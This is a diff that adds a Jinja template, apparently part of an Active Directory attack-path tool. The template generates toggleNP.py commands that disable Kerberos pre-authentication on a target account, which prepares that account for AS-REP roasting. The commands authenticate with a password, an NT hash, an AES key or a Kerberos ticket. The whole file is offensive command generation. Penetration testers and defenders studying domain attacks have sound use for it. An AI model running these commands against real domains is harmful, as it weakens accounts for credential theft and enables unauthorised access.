@@ -1,0 +1,10 @@
+# Toggle the flag do_not_preauth on {{target.name}}
+{% if parent.krb_auth %}
+./tools/toggleNP.py '{{fqdn}}/{{parent.obj.name}}@{{dc_name}}' -use-ldaps -dc-ip {{dc_ip}} -k -t '{{target.name}}' -w
+{%- elif parent.secret_type == T_SECRET_NTHASH %}
+./tools/toggleNP.py '{{fqdn}}/{{parent.obj.name}}@{{dc_ip}}' -use-ldaps -hashes :{{parent.secret|red}} -t '{{target.name}}' -w
+{%- elif parent.secret_type == T_SECRET_AESKEY %}
+./tools/toggleNP.py '{{fqdn}}/{{parent.obj.name}}@{{dc_ip}}' -use-ldaps -k -aesKey {{parent.secret|red}} -t '{{target.name}}' -w
+{%- elif parent.secret_type == T_SECRET_PASSWORD %}
+./tools/toggleNP.py '{{fqdn}}/{{parent.obj.name}}:{{parent.secret|red}}@{{dc_ip}}' -use-ldaps -t '{{target.name}}' -w
+{%- endif %}
